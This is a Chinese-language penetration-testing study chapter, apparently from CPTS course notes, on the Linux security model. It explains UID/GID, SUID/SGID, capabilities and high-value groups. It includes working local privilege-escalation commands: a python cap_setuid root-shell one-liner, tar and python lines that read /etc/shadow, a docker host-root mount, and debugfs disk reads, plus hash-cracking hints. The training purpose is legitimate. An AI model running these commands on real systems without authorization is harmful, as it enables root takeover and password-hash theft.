# 第 88 章 - Linux 安全模型

## 標籤

- #cpts
- #chapter
- #linux
- #priv-esc
- #security-model

## 學習目標

- 理解 UID/GID/effective UID 的區別及其在提權中的意義。
- 知道 SUID/SGID/sticky bit 的作用。
- 理解 Linux capabilities 如何提供細粒度的特殊能力。
- 知道各類特殊群組（docker/lxd/disk）為何等同高價值控制面。

---

## 理論基礎：Linux 身份與權限元件

| 元件 | 說明 | 提權相關性 |
|------|------|----------|
| UID (real) | 程序真實擁有者 | 你是誰 |
| UID (effective) | 程序實際使用的身份（SUID 改變此值） | 程序以誰的身份操作 |
| GID | 群組身份 | 特殊群組可提供額外存取 |
| SUID bit | 執行時以檔案擁有者身份（通常 root）執行 | 核心提權面 |
| SGID bit | 執行時以檔案群組身份執行 | 較少見但仍需注意 |
| Sticky bit | 只有擁有者能刪除目錄內的檔案（如 /tmp） | 防止橫向影響 |
| Capabilities | 細粒度核心能力（不需要完整 root） | cap_setuid 等同 root 提權 |

---

## 身份與群組確認

```bash
# 當前身份完整資訊
id
# 輸出範例：
# uid=1001(user) gid=1001(user) groups=1001(user),4(adm),24(cdrom),27(sudo),999(docker)
# uid   → 使用者 ID 和名稱
# gid   → 主要群組
# groups → 所有附加群組（重點看這裡）

# 高價值群組一覽：
# sudo   → 可能有 sudo 權限
# docker → 可建立特權容器 → root
# lxd    → 可建立特權 lxc 容器 → root
# disk   → 可讀取原始磁碟 → 讀所有檔案
# adm    → 可讀系統日誌（可能有密碼）
# shadow → 可讀 /etc/shadow（密碼 hash）

# 查看所有本機帳號
cat /etc/passwd
# 欄位：username:password:UID:GID:comment:home:shell
# 重點：UID=0 的帳號（等同 root）、shell 是否是 /bin/bash

# 找有 login shell 的帳號（排除系統帳號）
grep -v "nologin\|false\|sync" /etc/passwd
# grep -v → 反向過濾，排除 nologin/false/sync 這些 shell

# 查看密碼 hash（需要讀取權限）
cat /etc/shadow 2>/dev/null
# 欄位：username:hash:last_change:min:max:warn:inactive:expire
# hash 以 $6$ 開頭 → SHA-512（hashcat -m 1800）
# hash 以 $1$ 開頭 → MD5（較弱）
# 若有讀取權限 → 直接 hashcat 破解

# 查看目前登入的使用者
w
# 輸出：誰在線上、來自哪裡、在做什麼
who
# 簡潔版

# 查看最近登入紀錄
last
# 輸出：歷史登入紀錄（使用者/IP/時間）
# last -a → 顯示主機名稱
```

---

## 檔案權限模型

```bash
# 基礎權限查看
ls -la /path/to/file
# 輸出：-rwsr-xr-x 1 root root 12345 Jan 1 /usr/bin/sudo
# 第1字元：- (file) / d (dir) / l (link)
# rws → s 表示有 SUID bit（r+w+s 而不是 r+w+x）
# r-x → 群組 可讀可執行
# r-x → 其他人 可讀可執行

# SUID bit 說明：
# 執行這個檔案時，程序的 effective UID 變成 root（檔案擁有者）
# 所以低權使用者執行時，程序以 root 身份運作

# 找有 SUID 的檔案（提權枚舉核心）
find / -perm -4000 -type f 2>/dev/null
# -perm -4000 → SUID bit 設定的檔案
# -type f     → 只找一般檔案（不找目錄）
# 2>/dev/null → 丟棄權限錯誤（安靜）

# 找有 SGID 的檔案
find / -perm -2000 -type f 2>/dev/null
# -perm -2000 → SGID bit

# 找任何人都可寫的檔案或目錄（危險設定）
find / -writable -type f 2>/dev/null | grep -v proc
# -writable → 當前使用者有寫入權限
# | grep -v proc → 排除 /proc（虛擬系統，很多）
```

---

## Linux Capabilities

```bash
# Capabilities 的概念：
# 傳統上 root 有所有能力，普通帳號什麼都沒有
# Capabilities 把 root 的能力分成細粒度的「能力集」
# 可以授予特定程序「部分」能力而不給完整 root

# 列出系統中有 capabilities 的 binary
getcap -r / 2>/dev/null
# getcap → 取得 capability
# -r     → 遞迴搜尋
# 2>/dev/null → 丟棄錯誤（通常是 Permission denied）

# 輸出範例：
# /usr/bin/python3.8 = cap_setuid,cap_setgid+eip
# /usr/bin/ping = cap_net_raw+p

# 高危險 capabilities（等同提權）：
# cap_setuid    → 可設定任意 UID → sudo python → os.setuid(0) → root
# cap_setgid    → 可設定任意 GID
# cap_dac_read_search → 繞過讀取 ACL → 讀任意檔案
# cap_dac_override    → 繞過所有 ACL → 讀/寫任意檔案
# cap_net_bind_service → 綁定低號 port（<1024）→ 較低危
# cap_sys_admin       → 幾乎等同 root（mount/unmount 等）

# 利用 cap_setuid 的 python 提權：
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# os.setuid(0) → 設定 effective UID 為 0（root）
# 需要 python3 有 cap_setuid 能力

# 利用 cap_dac_read_search 的 tar 讀取 shadow：
tar xf /dev/null --checkpoint=1 --checkpoint-action=exec='/bin/cat /etc/shadow > /tmp/shadow.txt'
# 更直接：直接讀
python3 -c 'open("/etc/shadow").read()'
# 若 python3 有 cap_dac_read_search，可繞過讀取限制
```

---

## 特殊群組濫用

```bash
# 確認自己的群組
id
# 找 docker / lxd / disk / shadow / adm

# docker 群組（等同 root）
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# docker run   → 建立並執行容器
# -v /:/mnt    → 把主機的 / 掛載到容器的 /mnt
# --rm         → 執行完自動刪除容器
# -it          → 互動式 terminal
# alpine       → 使用 Alpine Linux 映像
# chroot /mnt sh → 把容器 root 切換到主機 /，開啟 shell
# 結果：在容器內以 root 身份訪問主機完整檔案系統

# lxd 群組（同上，不同工具）
# 需要先初始化 lxd 並匯入 Alpine 映像（第 93 章詳述）

# disk 群組（讀原始磁碟）
# 找磁碟設備
ls /dev/sd* /dev/xvd* 2>/dev/null
# 用 debugfs 讀檔案（需要 disk 群組）
debugfs /dev/sda1
# debugfs 互動模式中：
# cat /etc/shadow → 直接讀取 shadow
```

---

## 速查表

```bash
# 身份確認
id
cat /etc/passwd | grep -v nologin | grep -v false

# 高價值群組
id | grep -E "sudo|docker|lxd|disk|shadow|adm"

# capabilities
getcap -r / 2>/dev/null

# SUID
find / -perm -4000 -type f 2>/dev/null

# 全域可寫
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## 關聯筆記

- [[87-Linux權限提升簡介|第 87 章 - Linux 提權簡介]]
- [[89-本機列舉|第 89 章 - 本機列舉]]
- [[91-SUID-SGID與Capabilities|第 91 章 - SUID、SGID 與 Capabilities]]
- [[93-容器與虛擬化|第 93 章 - 容器與虛擬化]]
- [[11-Volume-11-Linux-Privilege-Escalation-Index|Vol.11 - Linux PrivEsc]]
